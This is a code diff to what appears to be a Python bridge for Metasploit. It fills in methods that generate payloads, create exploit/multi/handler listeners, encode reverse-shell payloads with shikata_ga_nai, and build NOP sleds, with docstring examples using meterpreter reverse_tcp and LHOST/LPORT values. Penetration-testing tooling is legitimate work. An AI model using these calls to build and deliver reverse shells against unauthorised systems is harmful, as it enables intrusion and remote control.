@@ -472,45 +472,96 @@ class PayloadModule(BaseModule):
             f.write(exe_bytes)
 
         # Optionally start handler to receive callbacks
-        handler_job = payload.to_handler()
+        handler = payload.to_handler()
     """
 
-    def generate(self, format: str = "raw") -> bytes:
+    def generate(self, format: str = "raw", **extra_options) -> bytes:
         """Generate payload bytes.
 
         Args:
-            format: Output format (raw, exe, elf, dll, etc.)
+            format: Output format. For raw shellcode use "raw".
+                   For executable formats: "exe", "elf", "dll", "macho", etc.
+                   For source code: "c", "python", "ruby", "hex", "base64", etc.
+            **extra_options: Additional options to override module settings
 
         Returns:
             Generated payload as bytes
 
-        Note:
-            This is a placeholder - full implementation requires
-            Rust bridge support for payload generation.
+        Example:
+            # Generate raw shellcode
+            shellcode = payload.generate()
+
+            # Generate as C array
+            c_code = payload.generate(format="c")
+
+            # Generate with custom LPORT
+            shellcode = payload.generate(LPORT=5555)
         """
-        # TODO: Implement when Rust bridge adds generate() support
-        raise NotImplementedError(
-            "PayloadModule.generate() requires Rust bridge implementation. "
-            "For now, use msfvenom or the Ruby API directly."
-        )
+        from . import forge_payload, forge_formatted
 
-    def to_handler(self) -> Optional[str]:
-        """Start a handler for this payload.
+        # Collect current module options
+        opts = self._get_all_options()
+        opts.update(extra_options)
 
-        Creates an exploit/multi/handler configured for this payload
-        and starts it as a background job.
+        if format == "raw":
+            return forge_payload(self.fullname, opts)
+        else:
+            # Use forge_formatted for non-raw formats (returns string, encode to bytes)
+            result = forge_formatted(self.fullname, format, "buf", opts)
+            if isinstance(result, str):
+                return result.encode("utf-8")
+            return result
+
+    def to_handler(self) -> "ExploitModule":
+        """Create a handler module configured for this payload.
+
+        Creates an exploit/multi/handler configured to receive connections
+        from this payload. The handler is NOT started automatically - call
+        exploit_job() on the returned module to start it as a background job.
 
         Returns:
-            Job ID of the handler, or None if failed
+            ExploitModule configured as a handler for this payload
 
-        Note:
-            This is a placeholder - full implementation requires
-            Rust bridge support.
+        Example:
+            payload = create_module("payload/windows/meterpreter/reverse_tcp")
+            payload.options.LHOST = "192.168.1.100"
+            payload.options.LPORT = 4444
+
+            # Create and start handler
+            handler = payload.to_handler()
+            job_id = handler.exploit_job(payload.fullname)
+
+            # Or run blocking
+            session = handler.exploit(payload.fullname)
         """
-        # TODO: Implement when Rust bridge adds to_handler() support
-        raise NotImplementedError(
-            "PayloadModule.to_handler() requires Rust bridge implementation."
-        )
+        from . import create_module as _create_module
+
+        handler = _create_module("exploit/multi/handler")
+        handler.options.PAYLOAD = self.fullname
+
+        # Copy relevant options from payload to handler
+        for opt_name in ["LHOST", "LPORT", "RHOST", "RPORT"]:
+            try:
+                opt_val = self._rust._get_option(opt_name)
+                if opt_val is not None:
+                    handler._rust._set_option(opt_name, opt_val)
+            except Exception:
+                pass
+
+        return handler
+
+    def _get_all_options(self) -> dict:
+        """Get all currently set options as a dictionary."""
+        opts = {}
+        try:
+            structured = self._rust._options_structured()
+            for key in structured:
+                val = self._rust._get_option(key)
+                if val is not None and val != "":
+                    opts[key] = val
+        except Exception:
+            pass
+        return opts
 
 
 # =============================================================================
@@ -527,26 +578,89 @@ class EncoderModule(BaseModule):
 
     Example:
         encoder = create_module("encoder/x86/shikata_ga_nai")
-        encoded = encoder.encode(shellcode, badchars=b"\\x00\\x0a")
+
+        # Encode a payload using this encoder
+        encoded = encoder.encode_payload("linux/x86/shell_reverse_tcp",
+                                         LHOST="10.0.0.1", LPORT=4444)
+
+        # Or use forge_encoded directly (recommended)
+        from msf import forge_encoded
+        encoded = forge_encoded("linux/x86/shell_reverse_tcp",
+                               encoder="x86/shikata_ga_nai",
+                               iterations=3)
     """
 
-    def encode(self, data: bytes, badchars: Optional[bytes] = None) -> bytes:
-        """Encode payload data.
+    def encode_payload(
+        self,
+        payload_name: str,
+        iterations: int = 1,
+        **options
+    ) -> bytes:
+        """Encode a payload using this encoder.
+
+        This generates a payload and encodes it using this encoder module.
+        For encoding arbitrary bytes, use the lower-level forge_* functions.
 
         Args:
-            data: Raw payload bytes to encode
-            badchars: Characters to avoid in output
+            payload_name: Full payload path (e.g., "linux/x86/shell_reverse_tcp")
+            iterations: Number of encoding iterations (default: 1)
+            **options: Payload options (LHOST, LPORT, etc.)
 
         Returns:
             Encoded payload bytes
 
-        Note:
-            This is a placeholder - full implementation requires
-            Rust bridge support.
+        Example:
+            encoder = create_module("encoder/x86/shikata_ga_nai")
+            encoded = encoder.encode_payload(
+                "linux/x86/shell_reverse_tcp",
+                iterations=3,
+                LHOST="10.0.0.1",
+                LPORT=4444
+            )
         """
-        # TODO: Implement when Rust bridge adds encode() support
+        from . import forge_encoded
+
+        # Strip 'encoder/' prefix if present in our fullname
+        encoder_name = self.fullname
+        if encoder_name.startswith("encoder/"):
+            encoder_name = encoder_name[8:]  # Remove "encoder/" prefix
+
+        return forge_encoded(payload_name, encoder_name, iterations, options or None)
+
+    def encode(
+        self, data: bytes, badchars: Optional[bytes] = None, iterations: int = 1
+    ) -> bytes:
+        """Encode raw payload data using this encoder.
+
+        Note: Direct raw byte encoding is not currently supported through the
+        bridge. For encoding payloads, use encode_payload() instead, or use
+        forge_payload_with_badchars() which auto-selects an encoder.
+
+        Args:
+            data: Raw payload bytes to encode
+            badchars: Characters to avoid in output
+            iterations: Number of encoding iterations
+
+        Raises:
+            NotImplementedError: Raw byte encoding requires direct Ruby FFI
+
+        Alternatives:
+            # Option 1: Use forge_encoded with a payload name
+            from msf import forge_encoded
+            encoded = forge_encoded("linux/x86/shell_reverse_tcp",
+                                   encoder="x86/shikata_ga_nai")
+
+            # Option 2: Auto-select encoder to avoid badchars
+            from msf import forge_payload_with_badchars
+            encoded, encoder_used = forge_payload_with_badchars(
+                "linux/x86/shell_reverse_tcp",
+                badchars=b"\\x00\\x0a"
+            )
+        """
         raise NotImplementedError(
-            "EncoderModule.encode() requires Rust bridge implementation."
+            "Direct raw byte encoding is not supported. Use encode_payload() "
+            "to encode a payload by name, or use forge_payload_with_badchars() "
+            "for automatic encoder selection."
         )
 
 
@@ -575,21 +689,32 @@ class NopModule(BaseModule):
     ) -> bytes:
         """Generate a NOP sled.
 
+        A NOP sled is a sequence of no-operation instructions that can be
+        placed before shellcode in buffer overflow exploits. The CPU slides
+        through the NOP instructions until it reaches the shellcode.
+
         Args:
             length: Desired length of the sled in bytes
-            badchars: Characters to avoid in output
-            save_registers: Registers to preserve
+            badchars: Bytes to avoid in output (e.g., b"\\x00\\x0a\\x0d")
+            save_registers: Registers to preserve (e.g., ["eax", "ebx"])
 
         Returns:
             NOP sled as bytes
 
-        Note:
-            This is a placeholder - full implementation requires
-            Rust bridge support.
+        Example:
+            # Simple NOP sled
+            nop = create_module("nop/x86/single_byte")
+            sled = nop.generate_sled(100)
+            print(len(sled))  # 100
+
+            # NOP sled avoiding null bytes
+            sled = nop.generate_sled(50, badchars=b"\\x00")
+
+            # NOP sled preserving registers
+            sled = nop.generate_sled(32, save_registers=["eax", "ebx"])
         """
-        # TODO: Implement when Rust bridge adds generate_sled() support
-        raise NotImplementedError(
-            "NopModule.generate_sled() requires Rust bridge implementation."
-        )
+        # Convert badchars to list of ints for Rust
+        bc = list(badchars) if badchars else None
+        return self._rust.generate_sled(length, bc, save_registers)
 
 
